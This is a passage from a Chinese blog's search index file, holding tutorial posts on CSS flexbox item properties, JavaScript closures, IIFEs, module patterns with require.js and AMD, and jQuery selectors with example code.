space-around:每根轴线两侧的间隔都相等，所以轴线之间的间隔比轴线与边框的间隔大一倍▪ stretch:轴线占满整个交叉轴 四、项目的属性 ▪ order:属性定义项目的排序顺序。数值越小，排列越靠前，默认为0▪ flex-grow:属性定义了项目的放大比例，默认为0，即如果存在剩余空间，也不放大，如果所有属性都为1,则平分所有剩余空间。若有一个为2，其他都为1，则前者占据的剩余空间将比其他项多一倍▪ flex-shrink:属性定义了项目的缩小比例，默认为1，即如果空间不足，该项目将缩小▪ flex-basis:属性定义了在分配多余空间之间，项目占据的主轴空间（main size），浏览器根据这个属性，计算主轴是否有多余空间。它的默认值为auto，即项目的本来大小。▪ flex:flex属性是flex-grow , flex-shrink 和 flex-basis 的简写，默认值为0 1 auto。后两个属性可选。▪ align-self: align-self 属性允许单个项目有与其他项目不一样的对齐方式，可覆盖 align-items 属性。默认值为 auto ，表示继承父元素的 align-items 属性，如果没有父元素，则等同于 stretch。]]></content>
      <categories>
        <category>界面布局</category>
      </categories>
      <tags>
        <tag>flex</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascript闭包]]></title>
    <url>%2F2018-05-08-deepinto-closure.html</url>
    <content type="text"><![CDATA[JavaScript闭包 闭包变量的作用域（1）要理解闭包，首先必须理解javascript特殊的变量作用域，变量的作用无非是两种：全局变量和局部变量，js语言的特殊之处，就在于函数内部可以直接读取全局变量。 12345var n = 999;function f1()&#123; alert(n);&#125;f1(); //999 （2）另一方面，在函数的外部无法读取函数内部的局部变量 1234function f1()&#123; var n = 999;&#125;alert(n); //error 注意：函数内部声明变量时要用 var，否则就是全局变量 12345function f1()&#123; n = 999;&#125;f1();alert(n); //999 如何从外部读取局部变量在函数的内部再定义一个函数 123456function f1()&#123; n = 999; function f2()&#123; alert(n); //999 &#125;&#125; js语言“链式作用域”结构（chain scope）：函数f2在函数f1内部，这时f1内部所有局部变量，对于f2都是可见，反过来则不行。子对象会一级一级地向上寻找所有父对象的变量，所有对于父对象的所有变量，对子对象都是可见的，反之则不行。既然f2可以读取f1中的局部变量，那么只要把f2作为返回值，就可以在f1外部读取它的内部变量 12345678910function f1()&#123; n = 999; function f2()&#123; alert(n); &#125; return f2;&#125;var result = f1();result(); //999 闭包的概念简而言之，闭包就是可以读取其他函数内部变量的函数，本质上，闭包就是将函数内部与函数外部连接起来的一座桥梁 闭包的用途（1）读取函数内部的变量（2）让函数内部的变量的值始终保持在内存中1234567891011121314function f1()&#123; var n = 999; nAdd = function()&#123; n+=1 &#125; function f2()&#123; alert(n); &#125; return f2;&#125;var result = f1();result(); //999nAdd();result(); //1000 函数f1是f2的父函数，而f2被赋予了一个全局变量，这导致了f2始终在内存中，而f2的存在依赖于f1，因而f1也始终存在于内存中，不会在调用结束后被回收。另外 nAdd=function(){n+=1} nAdd是一个全局变量，它的值是一个匿名函数，这个匿名函数本身也是一个全局变量。 使用闭包的注意点（1）内存泄露，造成网页性能下降，退出函数之前，将不使用的局部变量都删除（2）闭包会在父函数外部，改变父函数内部变量的值。所以，如果你把父函数当作对象（object）使用，把闭包当作它的公用方法（Public Method），把内部变量当作它的私有属性（private value），这时一定要小心，不要随便改变父函数内部变量的值。 具体案例分析12345678910function a()&#123; var i = 0; function b()&#123; alert(++i); &#125; return b;&#125;var c = a();c(); 代码特点：1.函数b嵌套在函数a内部2.函数a返回函数b引用关系如下图 var c = a() 实际上，变量c指向了函数b当函数a的内部函数被函数a外的一个变量引用时候，就创建了一个闭包透彻点说，所谓的“闭包”，就是在构造体内定义另外的函数作为目标对象的方法函数，而这个对象的方法函数反过来引用外层函数体中的临时变量，这使得只要目标对象在生存期内始终能保存其方法，就能间接保持原构造函数体当时用到的临时变量值。尽管最开始的构造函数调用以及结束，临时变量的名称也都消失了，但在目标对象的方法内却始终能引用到该变量的值而且该值只能通过这种方法来访问，即使再次调用相同的构造函数，但只会生成新对象和方法，新的临时变量只是对应新的值，和上次的调用都是各自独立的。 闭包内的微观世界函数的执行环境（excution context）\活动对象（call object）\作用域（scope）\作用域链（scope chain）· 当定义函数a的时候，js解释器会将函数a的作用域链（scope chain）设置为定义a时a所在的环境，如果a是一个全局函数，则scope chain 中只有window对象· 当执行函数a的时候，a会进入相应的执行环境（excution context）· 在创建执行环境的过程中，首先会为a添加一个scope属性，即a的作用域，其值就是为第一步中的scope chain,即a.scope = a的作用域链· 然后执行环境会创建一个活动对象（call object）。活动对象也是一个拥有属性的对象，但它不具有原型而且不能通过javaScript代码直接访问，创建完活动对象，把活动对象添加到a的作用域链的最顶端，此时a的作用域脸包含了两个对象：a的活动对象和window对象· 下一步就是在活动对象上添加一个arguments属性，它保存着调用函数时a所传递的函数· 最后就把所有函数a的形参和内部的函数b的引用也添加到a的活动对象上，在这一步中，完成了函数b的定义，函数b的作用域链被设置为b所定义的环境，就是a的作用域 到此，整个函数a从定义到执行的步骤就完成了。此时a返回函数b的引用给c，又函数b的作用域链包含了对函数a的活动对象的引用，也就是说b可以访问到a中定义的所有变量和函数。函数b被c引用，函数b又依赖函数a，因此函数a在返回后不会被GC回收。当函数b执行的时候亦会像以上步骤一样。因此，执行时b的作用域链包含了3个对象：b的活动对象、a的活动对象和window对象，如下图所示：如图所示，当在函数b中访问一个变量的时候，搜索顺序是：· 先搜索自身的活动对象，如果存在则返回，如果不存在将继续搜索函数a的活动对象，依次查找，直到找到为止。· 如果函数b存在prototype原型对象，则在查找完自身的活动对象后先查找自身的原型对象，再继续查找。这就是Javascript中的变量查找机制。· 如果整个作用域链上都无法找到，则返回undefined。]]></content>
      <categories>
        <category>javaScript相关</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascript匿名函数]]></title>
    <url>%2F2018-03-21-javascript-anonymousFunctions.html</url>
    <content type="text"><![CDATA[JavaScript匿名函数 匿名函数匿名函数： 123(function(window,undefied)&#123; //jQuery code&#125;)(window); 这个一个自调用匿名函数。第一个括号创建了一个匿名函数，第二个括号立即执行 通过定义一个这样的匿名函数，创建了一个“私有”的命名空间，该命名空间的变量和方法，不会破坏全局的命名空间。这点非常有用也是一个Js框架必须支持的功能。jQuery被应用在成千上万的js程序中，必须保证jQuery创建的变量不能与导入他的程序所使用的变量有所冲突。 匿名函数从语法上叫函数直接量，js语法需要包围匿名函数的括号，事实上调用匿名函数的有两种写法： 123456789(function()&#123; console.info(this); console.info(arguments);&#125;(window);) (function()&#123; console.info(this); console.info(arguments); &#125;)(window);]]></content>
      <categories>
        <category>javaScript相关</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascript模块化]]></title>
    <url>%2F2018-03-21-javascript-module.html</url>
    <content type="text"><![CDATA[JavaScript模块化思想 模块化模块化的基本思想（1）原始写法：模块就是实现特地功能的一组方法（将不同函数简单地放在一起，就是一个模块） 123456function m1()&#123;//...&#125;function m2()&#123;//...&#125; 缺点：污染了全局变量，无法保证不与其他模块发送变量名的冲突，而且模块成员间看不出来直接关系（2）对象写法：将模块写成一个对象，将所有模块成员都放在对象里面 123456789var module = new Object(&#123;_count : 0, m1 : function()&#123; //... &#125; m2 : function()&#123; //... &#125;&#125;); 优点：函数m1()与函数m2()都封装在module对象中，使用的时候就是调用对象中的属性module.m1(); module._count = 5;（3）立即执行函数写法IIFE 可以达到不暴露私有成员的目的 12345678910111213var module = (function()&#123; var _count = 0; var m1 = function()&#123; //... &#125;; var m2 = function()&#123; //... &#125;; return &#123; m1 : m1, m2 : m2, &#125;&#125;)(); 优点：外部代码无法读取内部_count变量 console.log(module._count); //undefined（4）放大模式如果模块很大，必须分成几个部分，或者是一个模块需要继承另外一个模块，就有必要使用放大模式（augmentation） 123456var module = (function (mod)&#123; mod.m3 = function()&#123; //... &#125;; return mod;&#125;)(module); 上面的代码为module模块添加了一个新的方法m3，然后返回新的module模块。（5）宽放大模式（Loose augmentation）在浏览器环境中，模块的各个部分通常都是从网上获取的，有时候无法知道哪个部分会先加载。采取4的写法，第一个执行部分有可能加载一个不存在空对象 1234var module = (function (mod)&#123; //... return mod;&#125;)(window.module || &#123;&#125;); （6）输入全局变量独立性是模块的重要特点，模块内部最好不要与程序的其他部分交互，为了在模块内部调用全局变量，必须显式地将其他变量输入模块 123var module = (function($,YAHOO)&#123; //...&#125;)(jQuery, YAHOO); 上面的模块需要使用jQuery和YUI库，就要把这两个库（模块），当作是参数输入module中，这样做除了保证了模块的独立性，还使得模块之间的依赖关系变得明显。 AMD规范通行的javascript模块规范共有两种：CommonJs和AMD（1）CommonJS当node.js项目诞生后，将JavaScript语言用于服务器端编程，node.js的模块系统，就是参照CommonJS规范实现的。在CommonJS中有一个全局性方法require(),用于加载模块。假设有个数学模块math.js。就可以像下面那样加载 1234var math = require("math");//调用模块提供的方法math.add(2,3); 限制：CommonJS规范不适用浏览器环境，相同的代码，在浏览器中运行，必须等到math.js加载完成，如果加载的时候很长，那么整个应用就会停在那里等。这对服务端不是问题，因为所有的模块都是存放在本地硬盘或在那个，可以同步加载完成，等待的时间就是硬盘的读取时间。而在浏览器，因为模块都存放在服务端，等待时间取决于网速的快慢，可能要等很久的时间，浏览器处于假死的状态。因此浏览器端的模块不可以采用同步加载（synchronous）,只能采用异步加载（asynchronous）这就是AMD诞生的背景。（2）AMD全程“Asynchronous Module Definition”意思是异步模块定义。它采用异步方式加载模块，模块的加载不影响后面语句的运行。所有一栏这个模块的语句，都定义在一个回调函数中。等到加载完成后，这个回调函数才会执行。AMD也采用require()语句加载模块，不同于CommonJS的是它要求两个参数。 1require([module],callback); 第一个参数[module]是一个数组，里面的成员就是要加载的模块；第二个参数callback则是加载完成之后的回调函数。还是使用CommonJS的代码，如下 123require([‘math’]，function(math)&#123; math.add(2,3);&#125;); math.add()与math模块加载不是同步的，所以浏览器不会出现假死的状态。AMD比CommonJS更适合浏览器环境 require.js的使用（1）原始加载js方法加载多个js文件，加载的时候浏览器会停止网页渲染，加载的文件越多，页面失去响应的时间就会越长。其次由于js文件之间存在依赖关系。因此必须严格保证加载顺序，依赖性最大的模块一定要放在最后加载，当依赖关系很复杂的时候，代码的编写和维护都会变得困难。（2）require.js的加载优点：实现了js文件的异步加载，避免了网页失去响应，管理模块之间的依赖性，便于代码的编写和维护。使用步骤：1.下载require.js2.加载这个require.js，也可能造成网页失去响应。解决办法有两个，一个是把它放在网页底部加载，另一个是 &lt;script src=&quot;js/require.js&quot; defer aysnc = &#39;true&#39;&gt;&lt;/script&gt;async属性表明这个文件需要异步加载，避免网页失去响应。IE不支持这个属性，只支持defer3.加载完require.js 后就要加载我们自己的代码，假定我们的代码文件是main.js,也放在js目录下。&lt;script src =&quot;js/require.js&quot; data-main=&quot;js/main&quot;&gt;&lt;/script&gt;data-main属性的作用是，指定网页程序的主要模块。（3）主模块的写法主模块要依赖其他模块，使用AMD规范定义的require()函数。 1234//main.jsrequire(['moduleA','moduleB','moduleC'],function(moduleA, moduleB, moduleC)&#123; //...&#125;); require()函数接受两个参数。第一个参数是数组，表示所依赖的模块。上例就是[‘moduleA’, ‘moduleB’, ‘moduleC’] ，即主模块依赖这三个模块。第二个参数就是一个回调函数，当前面指定的模块都加载完成之后，它将被调用，加载的模块会以参数形式传入该函数，从而在回调函数的内部就可以使用这些模块了。require()异步加载moduleA,moduleB,moduleC,浏览器就不会失去响应，它指定的回调函数，只有前面的模块都加载成功后，才会运行，解决了依赖性的问题。实际例子： 123require(['jquery','underscore','backbone'],function($,_,Backbone)&#123; //...&#125;); require.js会加载jQuery，underscore,backbone 然后再运行回调函数，主要模块的代码就写在回调函数中（4）模块的加载require.config()，我们可以通过这个方法，对模块的加载行为记性自定义。require.config()就写在主模块main.js的头部。参数是一个对象，这个对象的paths属性指定各个模块的加载路径。默认是在同一个目录（js子目录） 1234567require.config(&#123; paths: &#123; "jquery": "jquery.min", "underscore": "underscore.min", "backbone": "backbone.min", &#125;&#125;); 不在通过目录，例如在js/lib，有两种写法：1.逐一指定路径 1234567require.config(&#123; paths: &#123; "jquery": "lib/jquery.min", "underscore": "lib/underscore.min", "backbone": "lib/backbone.min", &#125;&#125;); 2.改变基目录 12345678require.config(&#123; baseUrl: "js/lib", paths: &#123; "jquery": "jquery.min", "underscore": "underscore.min", "backbone": "backbone.min", &#125;&#125;); 如果是在另一个主机上，也可以指定它的地址 123456require.config(&#123; paths: &#123; "jquery": "https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min" &#125;&#125;); require.js要求每个模块都是单一个js文件，这样的话，加载多个模块，就会发送多次http请求，也会影响到网页的加载速度。因而它提供了一个优化工具，当模块部署完毕后，可以使用这个工具将多个模块合并在一个文件中，减少http请求数。（5）AMD写法require.js加载的模块，采用AMD规范，那就是说模板也应该按照AMD的规范来写。具体的说，就是模块必须采用特定的define()函数来定义。如果一个模块不依赖其他模块，那么可以直接定义在difine（）函数之中。假定现在有个math.js文件，它定了一个math模块，那么math.js就要这样写： 123456789//math.jsdefine(function()&#123; var add = function(x,y)&#123; return x+y; &#125;; return &#123; add : add &#125;;&#125;); 加载方法如下： 12345678910111213//main.jsrequire(['math'],function(math)&#123; alert(math.add(1,1));&#125;);//如果这个模块还依赖其他模块，那么define（）函数的第一个参数，就必须是一个数组，指明该模块的依赖性define(['myLib'],function(myLib)&#123; function foo()&#123; myLib.doSomething(); &#125; return &#123; foo : foo &#125;&#125;); 当require()函数加载上面的这个模块的时候，就会先加载myLib.js文件（6）加载非规范的模块在加载非规范的模块之前先用require.config()定义它们的一些特征，underscore与backbone这两个库为例子。 1234567891011require.config(&#123; shim: &#123; 'underscore':&#123; export:'_' &#125;, 'backbone':&#123; deps:['underscore','jquery'], exports: 'Backbone' &#125; &#125;,&#125;); require.config()接受一个配置对象，这个对象除了paths属性之外，还有一个shim属性，专门来配置不兼容的模块，具体来说，每个模块都要定义exports值（输出的变量名），来表明这个模块外部调用时的名称，deps数组来表明该模块的依赖性。jQuery的插件可以这样定义 123456shim&#123; jquery.srcoll':&#123; deps: ['jquery'], exports: 'jQuery.fn.scroll' &#125;&#125; （7）require.js插件domready插件，可以让回调函数在页面DOM结构加载完成后再运行 123require([&apos;domready!&apos;],function(doc)&#123; //called once the Dom is ready&#125;); text和image插件，则是运行require.js加载文本和图片文件 1234define(['text!review.txt','image!cat.jpg'],function(review,cat)&#123; console.log(review); document.body.appendChild(cat);&#125;); 参考自阮一峰老师文章]]></content>
      <categories>
        <category>javaScript相关</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Jquery复习（视频心得）]]></title>
    <url>%2F2018-02-22-jqueryReview.html</url>
    <content type="text"><![CDATA[Jquery的一些基础回顾复习 jquery函数$(document).ready(fn) / $(fn) window.onload 与 $(document).ready(fn)的区别1.1 window.onload 需要等待页面完全加载完毕才能触发，即所有的Dom元素创建完毕、图片、Css等加载完毕后才可以触发。 $(document).ready() 只要Dom元素加载完成就可以触发，这样可以提供响应速度1.2 $(document).ready()可以注册多次事件处理程序，并且最终都会执行而 window.onload 每次注册新的事件处理程序时都会将前面的覆盖掉 使用jQuery实现 window.onload 的效果：$(window).load(fn) $.map(array,callback(element,index)) 对于数组 array 中的每个元素，调用 callback() 函数，最终返回一个新的数组，原数组不变 Example： 123456789var arrInt = [1, 2, 3, 4, 5, 6, 7]; var arrIntNEW = $.map(arrInt, function(element, index)&#123; if (index &gt; 3)&#123; return element * 2; &#125; else &#123; return element; &#125;&#125;);console.log(arrIntNEW); $.each(array,fn) 遍历数组，通过 return false 来退出循环，不能使用 break 来提出循环 Example： 12345678var arrInt = [1, 2, 3, 4, 5, 6, 7]; $.each(arrInt, function(key, value)&#123; if(key == 3)&#123; return false; //跳出循环 &#125; //当使用each遍历，普通的数组的时候，索引就是键，值就是值 console.log(key + ' , ' + value);&#125;); $.trim(字符串) 去掉两端空格，启动调试，可以F11进去源码查看原理 Example： 123var msg = ' hello '; console.log(msg);console.log($.trim(msg)); //去掉两边空格 jquery对象与Dom对象Example： 1234567891011121314151617181920212223window.onload = function()&#123; document.getElementById('btn').onclick = function()&#123; //获取层对象 //从页面上的元素对象才叫做dom对象，数值，日期对象，这些都不是dom对象 var dvObj = document.getElementById('div1'); dvObj.innerText = 'Hello!'; //当直接使用dom对象的时候存在浏览器兼容性问题 //为了解决浏览器的兼容性问题，所以这时可以把dom对象转为jQuery对象，然后再操作 //把dom对象转换为jQuery对象后，就可以调用对应的所有的jQuery对象的成员了 // Dom -&gt; jQuery var $dvObj = $(dvOjb); $dvObj.text('您好！); // jQuery -&gt; Dom (两种方法) 1. var domDiv = $dvObj[0]; 2. var domDiv = $dvObj.get(0); domDiv.innerText('我现在是dom对象书写出来的文字'); //jQuery对象： //可以把dom对象装换为jQuery对象 //也可以把jQuery对象转为dom对象 &#125;&#125; jquery选择器 Id选择器 $(“#id”) 标签选择器 $(“input”); 类选择器 $(“.class”); 标签+类选择器 $(“p.text”); 组合选择器 $(“选择器1”,”选择器2”,”选择器3”，”……”); 层次选择器 后代元素选择器：使用空格隔开 \$(“选择器1 选择器2”)，表示选取选择器1下所有的选择器2 子元素选择器：使用 &gt; 隔开 \$(“选择器1 &gt; 选择器2”) 相邻元素选择器：使用 + 或者 ~ `+`：$(&quot;.a + div&quot;) == $(&quot;.a&quot;).next 如果相邻的不是div 则不会继续向后找 `~`：$(&quot;.a ~ div&quot;) == $(&quot;.a&quot;).nextAll() 获取类名为a之后的所有兄弟div元素 \$(“div”).prev(“span”); 获取div上一个兄弟元素，并且该元素必须是span \$(“div”).prevAll(“span”); 获取div前面的所有span兄弟元素 \$(“div”).siblings(“span”); 获取div的所有span兄弟元素 特点：链式方程/隐式迭代 Example1: 1234567$(function()&#123; $("#bthSetText").click(function()&#123; $("p").text("我被改变了").css("background","#ff9").mouseover(function()&#123; $(this).css("background","#ff9").siblings().css("background",""); &#125;); &#125;);&#125;); Example2: 12345678910111213141516171819202122&lt;ul id="target"&gt;&lt;li&gt;公牛&lt;/li&gt;&lt;li&gt;小牛&lt;/li&gt;&lt;li&gt;牛奶&lt;/li&gt;&lt;li&gt;母牛&lt;/li&gt;&lt;/ul&gt;&lt;scirpt&gt;$(function()&#123; $("#target li").mouseover(function() &#123; //鼠标悬浮事件 $(this).css("background","#ff9").siblings('li').css("background",""); &#125;).click(function()&#123; //单击事件 //有些方法会破坏链式编程中返回的对象，比如： next(),nextAll(),prev(),prevAll(),siblings() //无参数的：text()、val()、html() //当链式编程的链被破坏时可以用end()修复 $(this).prevAll().css("background","green").end().nextAll().css("background","blue");&#125;);&#125;);&lt;/scirpt&gt; jQuery1.6以后有以下区别，1.6之前都是用attr attr() 与 prop()对于HTML元素本身就带有的 固有 属性，在处理时，使用 prop 方法。对于HTML元素我们自己 自定义 的DOM属性，在处理时，使用 attr 方法。 过滤选择器（:）:first 选取 第一个 元素 $(&quot;div:first&quot;):last 选取 最后一个 元素 $(&quot;div:last&quot;):not(选择器)选取 不满足选择器 条件的元素 $(&quot;input:not(.myClass)&quot;):even \ :odd 选取索引是 偶数 、奇数 的元素 $(&quot;input:even&quot;):eq(索引序号) \ ：gt(索引序号) \ :lt(索引序号) 选取索引 等于 、大于 、小于 索引号的元素 $(&quot;input:lt(5)&quot;) | $(&quot;input:lt(3):gt(0)&quot;):animated 选取正在 执行动画 的 div 元素$(&quot;.header&quot;) 选取所有 h1…h6 元素 Example1: 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;input type="button" name="" id="btn" value="点我"&gt;&lt;table id="t" border="1"&gt; &lt;tr&gt; &lt;td&gt;姓名&lt;/td&gt; &lt;td&gt;成绩&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;a&lt;/td&gt; &lt;td&gt;100&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;b&lt;/td&gt; &lt;td&gt;99&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;c&lt;/td&gt; &lt;td&gt;98&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;d&lt;/td&gt; &lt;td&gt;97&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;e&lt;/td&gt; &lt;td&gt;98&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;f&lt;/td&gt; &lt;td&gt;97&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;平均分&lt;/td&gt; &lt;td&gt;97&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;&lt;script&gt; $(function()&#123; $("#btn").click(function()&#123; $("#t tr:first").css("font-size","70px"); $("#t tr:gt(0):lt(3)").css("font-size","28px"); $("#t tr:last").css("color","red"); $("#t tr:odd:not(:last)").css("background","red"); &#125;); &#125;);&lt;/script&gt; Example2: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;table id="b1" border="1" cellpadding="2" cellspacing="2"&gt; &lt;tr&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;&lt;script&gt; $(function()&#123; $("#b1 tr").click(function() &#123; $("td").css("background",""); $("td:even",$(this)).css("background","red"); //$(this) == $("#b1 tr") $("td:odd",$(this)).css("background","blue"); &#125;); &#125;);&lt;/script&gt; $(“td:even”,$(this)) 表示在上文鼠标所点击的 tr 里面来选择 td 属性过滤选择器$(&quot;div[id]&quot;) 选取有 id 属性的 &lt;div&gt;$(&quot;div[title=test]&quot;) 选取 title 属性为test的 &lt;div&gt;$(&quot;div[title!=test]&quot;) 选取 title 属性不为test的 &lt;div&gt;Example1: 1234567891011121314151617181920212223242526&lt;input type="text" name="a1"&gt;&lt;input type="text" name="a2"&gt;&lt;input type="text" name="a3"&gt;&lt;input type="text" name="a4"&gt;&lt;input type="text" name="a5"&gt;&lt;input type="text" name="a6"&gt;&lt;input type="text" name="a7"&gt;&lt;input type="text" name="a8"&gt;&lt;script&gt; //1.选取所有input属性，具有name属性的 $("input[name]").css(); //2.选取所有body下面具有name属性的元素 $("body *[name]").css(); //3.选取页面上具有name属性，同时name属性的开头为a的元素 $("body *[name^=a]").css(); //4.选取name属性为空的 $("body *[name=]").css(); //5.选取以name属性中a结尾的 $("body *[name$=a]").css(); //6.包含a的name的属性的元素 $("body *[name*=a]").css(); //7.name属性中不等于某个属性的 $("body *[name!='spec']").css(); //8.同时具有多个属性的 $("body *[name*=a] [id] [value]").css();&lt;/script&gt; 表单选择器$(&quot;:input&quot;) 选取所有&lt;input&gt;、&lt;textarea&gt;、&lt;select&gt; 和 &lt;button&gt;$(&quot;input&quot;) 不一样，只获得 &lt;input&gt;$(&quot;:text&quot;) == $(&quot;input[type=text]&quot;) 选取所有的单行文本框$(&quot;:password&quot;); 选取所有密码框上述同理的还有 :radio、:submit、:image、:reset、:button、:file、:hidden （替代了$(&quot;input[type=***]&quot;)） 表单对象属性过滤选择器$(&quot;#form :enabled&quot;) 选取id为form的表单内所有 启用 的元素$(&quot;#form :disabled&quot;) 选取id为form的表单内所有 禁用 的元素$(&quot;#input:checked&quot;) 选取所有 选中 的元素(Radio/Checkbox),中间不可有空格$(&quot;select :selected&quot;) 选取所有选中的 选项 的元素(下拉列表)]]></content>
      <categories>
        <category>jQuery相关</category>
      </categories>
      <tags>
        <tag>jQuery</tag>
      </tags>
  </entry>
</search>
